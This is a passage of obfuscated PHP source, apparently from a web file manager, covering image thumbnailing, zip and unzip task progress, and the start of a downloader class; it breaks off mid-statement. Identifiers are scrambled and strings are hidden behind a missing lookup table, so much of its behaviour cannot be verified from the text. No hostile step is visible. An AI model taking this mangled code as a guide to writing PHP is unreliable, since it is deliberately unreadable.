$dĞÊ¢àÕ¢ô = $Dœ©†¿Üâ‡ - (($dô‚ãõãø << 7) - $dô‚ãõãø) * $F…ˆĞ·Ÿ²; $cå“ÊÀ’³Ñ = (($CÈõÎô << 8) - $CÈõÎô) * $f¢Ÿ×¼‰‘×; $D™ìôØ·öÆ = (($cĞÏšø£õ << 8) - $cĞÏšø£õ) * $Cøåï½“‡—; $få¦çÂ»Á = (($CÍ„Íµ‚”Ğ << 8) - $CÍ„Íµ‚”Ğ) * $c‚§‚—ò®£; imagesetpixel($F¾«ÉÈÖ‹Ù, $Eæ˜ó…‚©¶, $Bˆâõîßœ‘, $dĞÊ¢àÕ¢ô << 24 | $cå“ÊÀ’³Ñ << 16 | $D™ìôØ·öÆ << 8 | $få¦çÂ»Á); } } imagealphablending($F¾«ÉÈÖ‹Ù, !0); goto aóÎäàÉ‘; a¢ëïÈ°å: $F¾«ÉÈÖ‹Ù = imagecreatetruecolor($ešæŒÉŠĞ, $a‚†íİ‡ Ç); imagealphablending($F¾«ÉÈÖ‹Ù, !1); if ($B˜ˆÀ ’×) { imagesavealpha($F¾«ÉÈÖ‹Ù, !0); } goto dßá•¸æŞŞ; AÙ°¾§Œ·: $f¢Ÿ×¼‰‘× = $bøáÌ‰ó ? 1 / $bøáÌ‰ó : 1; $Cøåï½“‡— = $CÏˆ™ªóòå ? 1 / $CÏˆ™ªóòå : 1; $c‚§‚—ò®£ = $bøŒ™Üìƒ¡ ? 1 / $bøŒ™Üìƒ¡ : 1; goto Dóù“œëã; aóÎäàÉ‘: } return $F¾«ÉÈÖ‹Ù; goto d½ÍŸ±ù‡; déîéÎé›˜: $a‚†íİ‡ Ç = abs($dÕâÕÌ”Ş¢); $Bˆâõîßœ‘ = $dÕâÕÌ”Ş¢ > 0 ? $a‚†íİ‡ Ç - 1 : 0; $B¦ã«…Œ… = $dÕâÕÌ”Ş¢ > 0 ? -1 : 1; goto Aè“”õõƒ•; d½ÍŸ±ù‡: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($fÍÚìî£Å™, $Dêª”‰šÑº) { goto BÒ’ø¼ˆÉÈ; b­Ã„Ëî‡©: if (!$this->im) { return !1; } $cÙòº¦á¤“ = $_SERVER[Ìó][33]; $this->imgData = GetImageSize($fÍÚìî£Å™, $cÙòº¦á¤“); goto Cî…ˆ¶š†²; BÒ’ø¼ˆÉÈ: $this->srcFile = $fÍÚìî£Å™; $this->echoType = $Dêª”‰šÑº; $this->im = self::image($fÍÚìî£Å™); goto b­Ã„Ëî‡©; Cî…ˆ¶š†²: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto fùêòĞº‰—; fùêòĞº‰—: } public static function image($cÆñ“À©Éä) { $d¸ò„éÄÎõ =& $_SERVER[Ìó]; $C¼×ˆäÊãÀ = $d¸ò„éÄÎõ[33]; $bƒÛš¯Èö‹ = GetImageSize($cÆñ“À©Éä, $C¼×ˆäÊãÀ); $a…ìÎ‘ŞÂÛ = !1; switch ($bƒÛš¯Èö‹[2]) { case IMAGETYPE_GIF: if (!function_exists($d¸ò„éÄÎõ[1832])) { break; } $a…ìÎ‘ŞÂÛ = imagecreatefromgif($cÆñ“À©Éä); break; case IMAGETYPE_JPEG: if (!function_exists($d¸ò„éÄÎõ[1833])) { break; } $a…ìÎ‘ŞÂÛ = imagecreatefromjpeg($cÆñ“À©Éä); break; case IMAGETYPE_PNG: if (!function_exists($d¸ò„éÄÎõ[1834])) { break; } $a…ìÎ‘ŞÂÛ = @imagecreatefrompng($cÆñ“À©Éä); imagesavealpha($a…ìÎ‘ŞÂÛ, !0); break; case IMAGETYPE_XBM: $a…ìÎ‘ŞÂÛ = imagecreatefromxbm($cÆñ“À©Éä); break; case IMAGETYPE_WBMP: $a…ìÎ‘ŞÂÛ = imagecreatefromwbmp($cÆñ“À©Éä); break; case IMAGETYPE_BMP: $a…ìÎ‘ŞÂÛ = imagecreatefrombmp($cÆñ“À©Éä); break; default: break; } return $a…ìÎ‘ŞÂÛ; } public static function imageSize($E½“‰‰È¯Ğ) { $e¦‘¶©‡æà =& $_SERVER[Ìó]; $CŞ‘³·ôˆê = GetImageSize($E½“‰‰È¯Ğ); if (!$CŞ‘³·ôˆê) { return !1; } return array($e¦‘¶©‡æà[1835] => $CŞ‘³·ôˆê[0], $e¦‘¶©‡æà[1836] => $CŞ‘³·ôˆê[1]); } function distortion($fßİ‹Ùí, $dÚ¡“äĞ‰¡, $b‡¨œë­¼) { $eŞÎîêæØó = $this->creatImage($this->im, $dÚ¡“äĞ‰¡, $b‡¨œë­¼, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($eŞÎîêæØó, $fßİ‹Ùí); } function prorate($b¸½ò”Ì¢Ø, $b¶¬¢ƒÏ³, $b¨ò§òˆ¤¥) { $Eï›¤Öé¯“ = $b¶¬¢ƒÏ³ / $b¨ò§òˆ¤¥; $BğÁØ¢İ¼Š = $this->srcW / $this->srcH; if ($Eï›¤Öé¯“ <= $BğÁØ¢İ¼Š) { $BóÔì÷Šğ• = $b¶¬¢ƒÏ³; $Cøš¾ˆó = $BóÔì÷Šğ• * ($this->srcH / $this->srcW); } else { $Cøš¾ˆó = $b¨ò§òˆ¤¥; $BóÔì÷Šğ• = $Cøš¾ˆó * ($this->srcW / $this->srcH); } if ($this->srcW > $b¶¬¢ƒÏ³ || $this->srcH > $b¨ò§òˆ¤¥) { $c¿¬¤â‚†¿ = $this->creatImage($this->im, $BóÔì÷Šğ•, $Cøš¾ˆó, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($c¿¬¤â‚†¿, $b¸½ò”Ì¢Ø); } else { $c¿¬¤â‚†¿ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($c¿¬¤â‚†¿, $b¸½ò”Ì¢Ø); } } function cut($e™ï•»³­°, $A¬˜îĞÛ­ø, $cø¿Òºˆˆª) { goto eœÙùßî£; Fİ¡˜ÎĞ‡: $F‰†ğË¥È¬ = $this->creatImage($this->im, $aôÊ„íÜñ­, $Dãğ§¢¸è’, 0, 0, 0, 0, $this->srcW, $this->srcH); $d¬è¯Ÿç’­ = $this->creatImage($F‰†ğË¥È¬, $A¬˜îĞÛ­ø, $cø¿Òºˆˆª, 0, 0, ($aôÊ„íÜñ­ - $A¬˜îĞÛ­ø) / 2, ($Dãğ§¢¸è’ - $cø¿Òºˆˆª) / 2, $A¬˜îĞÛ­ø, $cø¿Òºˆˆª); imageDestroy($F‰†ğË¥È¬); goto e÷ŒåèÕí; e÷ŒåèÕí: return $this->echoImage($d¬è¯Ÿç’­, $e™ï•»³­°); goto fÚÄê‰Ë…«; eœÙùßî£: $Bá¬İØÆ÷µ = $A¬˜îĞÛ­ø / $cø¿Òºˆˆª; $b·–Ú”Ï½ = $this->srcW / $this->srcH; if ($Bá¬İØÆ÷µ <= $b·–Ú”Ï½) { $Dãğ§¢¸è’ = $cø¿Òºˆˆª; $aôÊ„íÜñ­ = $Dãğ§¢¸è’ * ($this->srcW / $this->srcH); } else { $aôÊ„íÜñ­ = $A¬˜îĞÛ­ø; $Dãğ§¢¸è’ = $aôÊ„íÜñ­ * ($this->srcH / $this->srcW); } goto Fİ¡˜ÎĞ‡; fÚÄê‰Ë…«: } function backFill($AÊËÂ·ò†“, $Cõ³í‰ŠåÅ, $D… ¿äŒ¬¢, $cÛ…¬ÑßÏÔ = false, $B¥Á—ãíÈÖ = 255, $a±âÄÔ¥¨ = 255, $d°²ì‘ãßƒ = 255) { goto cœ¯”ô¢öò; cˆê§¡Ò¿ê: return $this->echoImage($D‰Á†Ü÷Şä, $AÊËÂ·ò†“); goto fİ¿Ê ùÄ‚; aæ’ˆ•½Í: if ($cÛ…¬ÑßÏÔ) { $B›“Ö¬¸èİ = imageColorTransparent($D‰Á†Ü÷Şä, $B›“Ö¬¸èİ); $A¾“òñöˆ = $D… ¿äŒ¬¢ - $aàÎğ›±•; } imageFilledRectangle($D‰Á†Ü÷Şä, 0, 0, $Cõ³í‰ŠåÅ, $D… ¿äŒ¬¢, $B›“Ö¬¸èİ); if ($this->srcW > $Cõ³í‰ŠåÅ || $this->srcH > $D… ¿äŒ¬¢) { $c·É¦¤Îñ = $this->creatImage($this->im, $eäÅ‚òÊŠğ, $aàÎğ›±•, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($eäÅ‚òÊŠğ < $Cõ³í‰ŠåÅ) { imageCopy($D‰Á†Ü÷Şä, $c·É¦¤Îñ, ($Cõ³í‰ŠåÅ - $eäÅ‚òÊŠğ) / 2, 0, 0, 0, $eäÅ‚òÊŠğ, $aàÎğ›±•); } else { if ($aàÎğ›±• < $D… ¿äŒ¬¢) { imageCopy($D‰Á†Ü÷Şä, $c·É¦¤Îñ, 0, $A¾“òñöˆ, 0, 0, $eäÅ‚òÊŠğ, $aàÎğ›±•); } else { imageCopy($D‰Á†Ü÷Şä, $c·É¦¤Îñ, 0, 0, 0, 0, $eäÅ‚òÊŠğ, $aàÎğ›±•); } } } else { imageCopyMerge($D‰Á†Ü÷Şä, $this->im, ($Cõ³í‰ŠåÅ - $eäÅ‚òÊŠğ) / 2, $A¾“òñöˆ, 0, 0, $eäÅ‚òÊŠğ, $aàÎğ›±•, 100); } goto cˆê§¡Ò¿ê; f·—ø¨³Ú: if (function_exists($_SERVER[Ìó][1837])) { @($D‰Á†Ü÷Şä = imageCreateTrueColor($Cõ³í‰ŠåÅ, $D… ¿äŒ¬¢)); if (!$D‰Á†Ü÷Şä) { $D‰Á†Ü÷Şä = imageCreate($Cõ³í‰ŠåÅ, $D… ¿äŒ¬¢); } } else { $D‰Á†Ü÷Şä = imageCreate($Cõ³í‰ŠåÅ, $D… ¿äŒ¬¢); } $A¾“òñöˆ = ($D… ¿äŒ¬¢ - $aàÎğ›±•) / 2; $B›“Ö¬¸èİ = imagecolorallocate($D‰Á†Ü÷Şä, $B¥Á—ãíÈÖ, $a±âÄÔ¥¨, $d°²ì‘ãßƒ); goto aæ’ˆ•½Í; cœ¯”ô¢öò: $EÀÒ›ÔŒöÚ = $Cõ³í‰ŠåÅ / $D… ¿äŒ¬¢; $AîÜÑÎõœ = $this->srcW / $this->srcH; if ($EÀÒ›ÔŒöÚ <= $AîÜÑÎõœ) { $eäÅ‚òÊŠğ = $Cõ³í‰ŠåÅ; $aàÎğ›±• = $eäÅ‚òÊŠğ * ($this->srcH / $this->srcW); } else { $aàÎğ›±• = $D… ¿äŒ¬¢; $eäÅ‚òÊŠğ = $aàÎğ›±• * ($this->srcW / $this->srcH); } goto f·—ø¨³Ú; fİ¿Ê ùÄ‚: } function creatImage($BïÉ‚†ï–±, $bÒÀİ…†‚Ö, $fİš¦ƒ¬Õá, $Cİ°¦ÌƒŒ¿, $BÏ›êªƒ±Ú, $B®ÈÈô„ÃÖ, $B–—Ğï©Ëè, $FÈÀ¤î³‚¤, $B‡œ‘Ğ‚‡ù) { if (function_exists($_SERVER[Ìó][1837])) { @($eâ×ÒœáÛ = ImageCreateTrueColor($bÒÀİ…†‚Ö, $fİš¦ƒ¬Õá)); @imagealphablending($eâ×ÒœáÛ, !1); @imagesavealpha($eâ×ÒœáÛ, !0); if ($eâ×ÒœáÛ) { imageCopyResampled($eâ×ÒœáÛ, $BïÉ‚†ï–±, $Cİ°¦ÌƒŒ¿, $BÏ›êªƒ±Ú, $B®ÈÈô„ÃÖ, $B–—Ğï©Ëè, $bÒÀİ…†‚Ö, $fİš¦ƒ¬Õá, $FÈÀ¤î³‚¤, $B‡œ‘Ğ‚‡ù); } else { $eâ×ÒœáÛ = ImageCreate($bÒÀİ…†‚Ö, $fİš¦ƒ¬Õá); imageCopyResized($eâ×ÒœáÛ, $BïÉ‚†ï–±, $Cİ°¦ÌƒŒ¿, $BÏ›êªƒ±Ú, $B®ÈÈô„ÃÖ, $B–—Ğï©Ëè, $bÒÀİ…†‚Ö, $fİš¦ƒ¬Õá, $FÈÀ¤î³‚¤, $B‡œ‘Ğ‚‡ù); } } else { $eâ×ÒœáÛ = ImageCreate($bÒÀİ…†‚Ö, $fİš¦ƒ¬Õá); imageCopyResized($eâ×ÒœáÛ, $BïÉ‚†ï–±, $Cİ°¦ÌƒŒ¿, $BÏ›êªƒ±Ú, $B®ÈÈô„ÃÖ, $B–—Ğï©Ëè, $bÒÀİ…†‚Ö, $fİš¦ƒ¬Õá, $FÈÀ¤î³‚¤, $B‡œ‘Ğ‚‡ù); } return $eâ×ÒœáÛ; } public function imgRotate($aš¼Â¤Ã‹Ù, $Fò®‹ìö›Š) { goto d‚Ü‚èÅÈÏ; d‚Ü‚èÅÈÏ: if (!$this->im || $Fò®‹ìö›Š % 360 === 0 || !function_exists($_SERVER[Ìó][1838])) { return !1; } $D½‹Î©¨” = imageRotate($this->im, 360 - $Fò®‹ìö›Š, 0); $fšâ»î×šĞ = !1; goto BÆ¨ËœŸ¥; B£Ò†¼á¯ï: return $fšâ»î×šĞ; goto eÕÚ¶§»Îƒ; BÆ¨ËœŸ¥: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $fšâ»î×šĞ = imagegif($D½‹Î©¨”, $aš¼Â¤Ã‹Ù); break; case IMAGETYPE_JPEG: $fšâ»î×šĞ = imagejpeg($D½‹Î©¨”, $aš¼Â¤Ã‹Ù, 100); break; case IMAGETYPE_PNG: $fšâ»î×šĞ = imagePNG($D½‹Î©¨”, $aš¼Â¤Ã‹Ù); break; default: break; } imageDestroy($D½‹Î©¨”); imageDestroy($this->im); goto B£Ò†¼á¯ï; eÕÚ¶§»Îƒ: } function echoImage($bÏ–Æ²‹å, $a¶—îˆ¾Ú) { goto a†ªà©îĞ¨; BË¼àĞòÂÃ: imageDestroy($this->im); return $BàåÄ¼Ü‹; goto A¼ó‘ù÷¨Ã; a†ªà©îĞ¨: $d¦ñì‰øÛ =& $_SERVER[Ìó]; if (!$bÏ–Æ²‹å) { return !1; } ob_get_clean(); goto AÃØÏ†¹‚; AÃØÏ†¹‚: $BàåÄ¼Ü‹ = !1; switch ($this->echoType) { case $d¦ñì‰øÛ[1839]: $BàåÄ¼Ü‹ = imagePNG($bÏ–Æ²‹å); break; case $d¦ñì‰øÛ[163]: $BàåÄ¼Ü‹ = imagePNG($bÏ–Æ²‹å, $a¶—îˆ¾Ú); break; } imageDestroy($bÏ–Æ²‹å); goto BË¼àĞòÂÃ; A¼ó‘ù÷¨Ã: } } goto EäŒ¿­Ÿ¥; BÑå©¹Ñ³: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto dƒÀ«£éÒ“; AæÖÔ¿×†¼: if (!$eŞâ±»Ùï[$BÌŸƒÂ¾[1317]]) { $eŞâ±»Ùï[$BÌŸƒÂ¾[1317]] = LNG($BÌŸƒÂ¾[1478]); } goto Aê  ‚Ùİ; dƒÀ«£éÒ“: $BÌŸƒÂ¾ =& $_SERVER[Ìó]; parent::startAfter(); Hook::bind($BÌŸƒÂ¾[1474], array($this, $BÌŸƒÂ¾[1475])); goto CÂ÷¨ä“Í; CÂ÷¨ä“Í: Hook::bind($BÌŸƒÂ¾[1031], array($this, $BÌŸƒÂ¾[1476])); $eŞâ±»Ùï =& $this->task; $eŞâ±»Ùï[$BÌŸƒÂ¾[1477]] = $BÌŸƒÂ¾[1036]; goto AæÖÔ¿×†¼; Aê  ‚Ùİ: } protected function endAfter() { $d–İÔ¤Ïï =& $_SERVER[Ìó]; parent::endAfter(); Hook::unbind($d–İÔ¤Ïï[1474], array($this, $d–İÔ¤Ïï[1475])); Hook::unbind($d–İÔ¤Ïï[1031], array($this, $d–İÔ¤Ïï[1476])); } public function updateAfter() { $C˜„ÛÅå¢È =& $_SERVER[Ìó]; $EˆİÓ§Áê› =& $this->task; if (!$EˆİÓ§Áê›[$C˜„ÛÅå¢È[974]] || !$EˆİÓ§Áê›[$C˜„ÛÅå¢È[694]]) { return; } if ($EˆİÓ§Áê›[$C˜„ÛÅå¢È[1477]] == $C˜„ÛÅå¢È[1036]) { $fµàšœ÷Æ = 0; if ($EˆİÓ§Áê›[$C˜„ÛÅå¢È[1454]]) { $fµàšœ÷Æ = $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1455]] / $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1454]]; } $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1410]] = $fµàšœ÷Æ * 0.3; } else { if ($EˆİÓ§Áê›[$C˜„ÛÅå¢È[1477]] == $C˜„ÛÅå¢È[297]) { $fµàšœ÷Æ = $EˆİÓ§Áê›[$C˜„ÛÅå¢È[986]] / $EˆİÓ§Áê›[$C˜„ÛÅå¢È[974]]; $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1410]] = 0.3 + $fµàšœ÷Æ * 0.4; } else { if ($EˆİÓ§Áê›[$C˜„ÛÅå¢È[1477]] == $C˜„ÛÅå¢È[102]) { $b‚•†²¾ì = 0; if ($EˆİÓ§Áê›[$C˜„ÛÅå¢È[1456]] == $C˜„ÛÅå¢È[102]) { $b‚•†²¾ì = $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1455]]; } $fµàšœ÷Æ = ($EˆİÓ§Áê›[$C˜„ÛÅå¢È[1459]] + $b‚•†²¾ì) / $EˆİÓ§Áê›[$C˜„ÛÅå¢È[694]]; $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1410]] = 0.3 + 0.4 + $fµàšœ÷Æ * 0.3; } } } if ($EˆİÓ§Áê›[$C˜„ÛÅå¢È[1410]] > 0) { $bä„ÎÒ÷„Œ = timeFloat() - $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1412]] - $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1415]]; $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1416]] = $bä„ÎÒ÷„Œ * (1 - $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1410]]) / $EˆİÓ§Áê›[$C˜„ÛÅå¢È[1410]]; } } public function addFile($bš‡©·îÔ£) { goto CÉ÷°ƒ»Ôã; a¿…“›‰: $bÆ¶½®·¯æ[$b´À©•§Â[974]] = 1; $B²ö£ó—ÆÏ = 0; $bÆ¶½®·¯æ[$b´À©•§Â[1460]] = array($b´À©•§Â[1461] => $B²ö£ó—ÆÏ + 1, $b´À©•§Â[382] => $aå­‰±ƒá[$b´À©•§Â[28]], $b´À©•§Â[75] => $aå­‰±ƒá[$b´À©•§Â[75]], $b´À©•§Â[461] => $aå­‰±ƒá[$b´À©•§Â[461]] ? $aå­‰±ƒá[$b´À©•§Â[461]] : $aå­‰±ƒá[$b´À©•§Â[75]]); goto Bíøàšˆº¸; bá»êĞÔö: $bÆ¶½®·¯æ[$b´À©•§Â[976]] = $b´À©•§Â[1467]; $bÆ¶½®·¯æ[$b´À©•§Â[1456]] = $b´À©•§Â[1036]; $bÆ¶½®·¯æ[$b´À©•§Â[694]] = $aå­‰±ƒá[$b´À©•§Â[77]]; goto a¿…“›‰; CÉ÷°ƒ»Ôã: $b´À©•§Â =& $_SERVER[Ìó]; $bÆ¶½®·¯æ =& $this->task; $aå­‰±ƒá = IO::info($bš‡©·îÔ£); goto Dš›İ È¬³; Bíøàšˆº¸: $this->update(); goto c‚ïø‘Œ‰³; Dš›İ È¬³: $bÆ¶½®·¯æ[$b´À©•§Â[1452]] = $aå­‰±ƒá[$b´À©•§Â[28]]; $bÆ¶½®·¯æ[$b´À©•§Â[1454]] = $aå­‰±ƒá[$b´À©•§Â[77]]; $bÆ¶½®·¯æ[$b´À©•§Â[1455]] = 0; goto bá»êĞÔö; c‚ïø‘Œ‰³: } public function unzipAfter($AÜ—´›¨îÎ) { goto DŸÂåÒÆÈ; Cº”›¥¤•: $this->update(); self::log($FõÀÈÇëîÍ[1479] . json_encode(array($DÔìæ¶£ƒ», $Aç‰¡çŠğ°))); goto dæ‹ùÓ¦; DŸÂåÒÆÈ: $FõÀÈÇëîÍ =& $_SERVER[Ìó]; $DÔìæ¶£ƒ» =& $this->task; $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[1477]] = $FõÀÈÇëîÍ[102]; goto Aµ“ˆ…‡›õ; Aµ“ˆ…‡›õ: $Aç‰¡çŠğ° = IO::infoWithChildren($AÜ—´›¨îÎ); $eóˆˆŠ©Ì = 0; $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[1460]] = array($FõÀÈÇëîÍ[1461] => $eóˆˆŠ©Ì + 1, $FõÀÈÇëîÍ[382] => $Aç‰¡çŠğ°[$FõÀÈÇëîÍ[28]], $FõÀÈÇëîÍ[75] => $Aç‰¡çŠğ°[$FõÀÈÇëîÍ[75]], $FõÀÈÇëîÍ[461] => $Aç‰¡çŠğ°[$FõÀÈÇëîÍ[461]] ? $Aç‰¡çŠğ°[$FõÀÈÇëîÍ[461]] : $Aç‰¡çŠğ°[$FõÀÈÇëîÍ[75]]); goto eí‹É–’ŠÏ; eí‹É–’ŠÏ: if ($Aç‰¡çŠğ°[$FõÀÈÇëîÍ[29]] == $FõÀÈÇëîÍ[163]) { $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[974]] = 1; } else { $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[974]] = $Aç‰¡çŠğ°[$FõÀÈÇëîÍ[80]][$FõÀÈÇëîÍ[78]]; } $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[976]] = $FõÀÈÇëîÍ[33]; $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[1456]] = 0; goto B§—ˆ±»Ø«; a°ƒ‰Ç: $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[1452]] = $FõÀÈÇëîÍ[33]; $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[1459]] = 0; $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[694]] = $Aç‰¡çŠğ°[$FõÀÈÇëîÍ[77]]; goto Cº”›¥¤•; B§—ˆ±»Ø«: $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[986]] = 0; $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[1454]] = 0; $DÔìæ¶£ƒ»[$FõÀÈÇëîÍ[1455]] = 0; goto a°ƒ‰Ç; dæ‹ùÓ¦: } public function nameParse($EÓÒ©ƒÅï) { goto CİØØÎƒŞÖ; eŠ–ù›®¨¨: $Aâ«„ò»Í = get_path_this($EÓÒ©ƒÅï); if (strstr($Aâ«„ò»Í, $bƒïáËÕà[91])) { $E™õåèæ¹¯[$bƒïáËÕà[986]] += 1; $E™õåèæ¹¯[$bƒïáËÕà[974]] += 1; } $E™õåèæ¹¯[$bƒïáËÕà[1452]] = $EÓÒ©ƒÅï; goto eÒ§„İÊ‚; CİØØÎƒŞÖ: $bƒïáËÕà =& $_SERVER[Ìó]; $E™õåèæ¹¯ =& $this->task; if ($E™õåèæ¹¯[$bƒïáËÕà[1477]] == $bƒïáËÕà[1036]) { $E™õåèæ¹¯[$bƒïáËÕà[1477]] = $bƒïáËÕà[297]; $E™õåèæ¹¯[$bƒïáËÕà[1459]] = 0; $E™õåèæ¹¯[$bƒïáËÕà[694]] = 0; } goto eŠ–ù›®¨¨; eÒ§„İÊ‚: $this->update(); goto AÒºó¿öÊŒ; AÒºó¿öÊŒ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $BëÔ‹¶ÇĞ” =& $_SERVER[Ìó]; parent::startAfter(); Hook::bind($BëÔ‹¶ÇĞ”[1480], array($this, $BëÔ‹¶ÇĞ”[1475])); $Eéİî×ÚÛÜ =& $this->task; $Eéİî×ÚÛÜ[$BëÔ‹¶ÇĞ”[1477]] = $BëÔ‹¶ÇĞ”[1036]; if (!$Eéİî×ÚÛÜ[$BëÔ‹¶ÇĞ”[1317]]) { $Eéİî×ÚÛÜ[$BëÔ‹¶ÇĞ”[1317]] = LNG($BëÔ‹¶ÇĞ”[1481]); } } protected function endAfter() { $e³´Ü¶šö =& $_SERVER[Ìó]; parent::endAfter(); Hook::unbind($e³´Ü¶šö[1480], array($this, $e³´Ü¶šö[1475])); } public function updateAfter() { $A«”• ¤³¸ =& $_SERVER[Ìó]; $b¹¶ÑçÂ° =& $this->task; if (!$b¹¶ÑçÂ°[$A«”• ¤³¸[974]] || !$b¹¶ÑçÂ°[$A«”• ¤³¸[694]]) { return; } if ($b¹¶ÑçÂ°[$A«”• ¤³¸[1477]] == $A«”• ¤³¸[1036]) { $a˜É–Ëâœ = $b¹¶ÑçÂ°[$A«”• ¤³¸[1455]]; if ($b¹¶ÑçÂ°[$A«”• ¤³¸[1456]] != $A«”• ¤³¸[1036]) { $a˜É–Ëâœ = 0; } $bô¿—ŠŒ¥× = ($b¹¶ÑçÂ°[$A«”• ¤³¸[1459]] + $a˜É–Ëâœ) / $b¹¶ÑçÂ°[$A«”• ¤³¸[694]]; $b¹¶ÑçÂ°[$A«”• ¤³¸[1410]] = $bô¿—ŠŒ¥× * 0.3; } else { if ($b¹¶ÑçÂ°[$A«”• ¤³¸[1477]] == $A«”• ¤³¸[297]) { $bô¿—ŠŒ¥× = $b¹¶ÑçÂ°[$A«”• ¤³¸[986]] / $b¹¶ÑçÂ°[$A«”• ¤³¸[974]]; $b¹¶ÑçÂ°[$A«”• ¤³¸[1410]] = 0.3 + $bô¿—ŠŒ¥× * 0.5; } else { if ($b¹¶ÑçÂ°[$A«”• ¤³¸[1477]] == $A«”• ¤³¸[102]) { $bô¿—ŠŒ¥× = 0; if ($b¹¶ÑçÂ°[$A«”• ¤³¸[1454]]) { $bô¿—ŠŒ¥× = $b¹¶ÑçÂ°[$A«”• ¤³¸[1455]] / $b¹¶ÑçÂ°[$A«”• ¤³¸[1454]]; } $b¹¶ÑçÂ°[$A«”• ¤³¸[1410]] = 0.3 + 0.5 + $bô¿—ŠŒ¥× * 0.2; } } } if ($b¹¶ÑçÂ°[$A«”• ¤³¸[1410]] > 0) { $E«ò…‘„ = timeFloat() - $b¹¶ÑçÂ°[$A«”• ¤³¸[1412]] - $b¹¶ÑçÂ°[$A«”• ¤³¸[1415]]; $b¹¶ÑçÂ°[$A«”• ¤³¸[1416]] = $E«ò…‘„ * (1 - $b¹¶ÑçÂ°[$A«”• ¤³¸[1410]]) / $b¹¶ÑçÂ°[$A«”• ¤³¸[1410]]; } } public function copyFileStart($C¿›½½î©¯, $E½ÖñÓâÁ, $eÒ±“Öí, $AŒ´»Ø™À, $fÂ¬øôíÁÌ, $fó¬ª‡á¶÷) { $f©Ûš“Ôò =& $_SERVER[Ìó]; parent::copyFileStart($C¿›½½î©¯, $E½ÖñÓâÁ, $eÒ±“Öí, $AŒ´»Ø™À, $fÂ¬øôíÁÌ, $fó¬ª‡á¶÷); $fòÒËíÈ¨° =& $this->task; if ($fòÒËíÈ¨°[$f©Ûš“Ôò[1477]] == $f©Ûš“Ôò[297]) { $fòÒËíÈ¨°[$f©Ûš“Ôò[1477]] = $f©Ûš“Ôò[102]; } $this->update(); } public function copyFileEnd($eŒçš’ç±ä, $aà²Áëœ¤, $FŸô¼äßãá, $Aª…Ç¯†²², $bÑ©”±ƒ† , $cÙŸ†£Ô˜¢) { $BÂ¬“ÌòÆÑ =& $_SERVER[Ìó]; $A¢Ş©¬ÁŞä =& $this->task; $A¢Ş©¬ÁŞä[$BÂ¬“ÌòÆÑ[1455]] = $A¢Ş©¬ÁŞä[$BÂ¬“ÌòÆÑ[1454]]; $A¢Ş©¬ÁŞä[$BÂ¬“ÌòÆÑ[1459]] += $A¢Ş©¬ÁŞä[$BÂ¬“ÌòÆÑ[1454]]; $A¢Ş©¬ÁŞä[$BÂ¬“ÌòÆÑ[1456]] = $BÂ¬“ÌòÆÑ[33]; $this->update(); } public function nameParse($e­‹Ùà©³‰) { $F©‡¸±ô§ª =& $_SERVER[Ìó]; $F”ÖîâÈŒª =& $this->task; if ($F”ÖîâÈŒª[$F©‡¸±ô§ª[986]] < $F”ÖîâÈŒª[$F©‡¸±ô§ª[974]]) { $E„ÇæšÙğ² = get_path_this($e­‹Ùà©³‰); if (strstr($E„ÇæšÙğ², $F©‡¸±ô§ª[91])) { $F”ÖîâÈŒª[$F©‡¸±ô§ª[986]] += 1; } } if ($F”ÖîâÈŒª[$F©‡¸±ô§ª[1477]] == $F©‡¸±ô§ª[1036]) { $F”ÖîâÈŒª[$F©‡¸±ô§ª[1477]] = $F©‡¸±ô§ª[297]; } $F”ÖîâÈŒª[$F©‡¸±ô§ª[1452]] = $e­‹Ùà©³‰; $this->update(); } } class Downloader { static function start($d‹•ôÅ»‰¶, $a…•¿Ì¢Ò¢, $a’çæ´½µä = 10) { goto Cé¬æÆ«¦ƒ; eÁÚ‘ÒÀ—Ÿ: if (is_file($bºãìÑàíì)) { $AÈ¬‡Ç¼Ÿ = file_get_contents($bºãìÑàíì); $b®ëì¦–¦¤ = json_decode($AÈ¬‡Ç¼Ÿ, 1); } if (file_exists($a…•¿Ì¢Ò¢) && $C«ÆÃ»·÷¨ == filesize($a…•¿Ì¢Ò¢)) { @unlink($déÛŠ­è); @unlink($bºãìÑàíì); return array($AŞêÀïó[1028] => !0, $AŞêÀïó[1030] => $AŞêÀïó[1485]); } if ($b®ëì¦–¦¤[$AŞêÀïó[321]] != $C«ÆÃ»·÷¨) { $b®ëì¦–¦¤ = array($AŞêÀïó[321] => $C«ÆÃ»·÷¨); } goto F®µİù‡š; CÃõ£µõë½: $déÛŠ­è = $a…•¿Ì¢Ò¢ . $AŞêÀïó[1483]; if (is_array($d‹•ôÅ»‰¶)) { $B¸Æ”ĞÎ°Ü = $d‹•ôÅ»‰¶; } else { $B¸Æ”ĞÎ°Ü = url_header($d‹•ôÅ»‰¶); } $d‹•ôÅ»‰¶ = 